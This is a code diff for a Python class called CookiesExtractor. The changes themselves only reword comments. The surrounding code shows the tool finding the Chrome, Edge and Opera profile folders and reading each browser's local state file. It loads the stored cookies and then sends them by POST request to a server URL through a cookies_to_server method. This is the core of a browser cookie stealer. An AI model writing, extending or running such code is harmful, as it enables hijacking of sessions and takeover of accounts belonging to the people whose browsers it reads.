@@ -118,7 +118,7 @@ class CookiesExtractor():
         return state_path
 
 
-    # returns either None or the content of in json format of the local state file.
+    # returns either None or the local state file content in json format.
     def __get_local_state_content(self, state_path: str) -> str or None:
         
         if state_path is None:
@@ -437,7 +437,7 @@ class CookiesExtractor():
         return cookies
 
     
-    # either returns None or a dictionary containing the info about Chrome and its cookies.
+    # fill the cookies variable with the Chrome cookies.
     def __browser_chrome(self) -> None:
 
         self.__logger.log("Finding Chrome installation default folder", 2)
@@ -475,7 +475,7 @@ class CookiesExtractor():
         self.__set_cookies(cookies)
         
 
-    # either returns an None or a dictionary containint the info about Edge and its cookies.
+    # fill the cookies variable with the Edge cookies.
     def __browser_edge(self) -> None:
 
         self.__logger.log("Finding Edge installation default folder", 2)
@@ -513,7 +513,7 @@ class CookiesExtractor():
         self.__set_cookies(cookies)
 
 
-    # either returns an None or a dictionary containing the info about Opera and its cookies.
+    # fill the cookies variable with the Opera cookies.
     def __browser_opera(self) -> None:
 
         self.__logger.log("Finding Opera installation default folder", 2)
@@ -597,7 +597,7 @@ class CookiesExtractor():
         self.__set_cookies(cookies)
 
 
-    # function to call for init cookies
+    # function to call for init cookies.
     def load(self):
         self.__logger.log("Loading {:s} cookies.".format(self.__browser.capitalize()), 2)
         if self.__browser == "firefox":
@@ -621,7 +621,7 @@ class CookiesExtractor():
         return json.dumps(self.__cookies, indent=4)
 
 
-    # send cookies to server url
+    # send cookies to server url.
     def cookies_to_server(self, url) -> None:
         self.__logger.log("Sending the POST request", 2)
         post(url, json=self.__cookies)
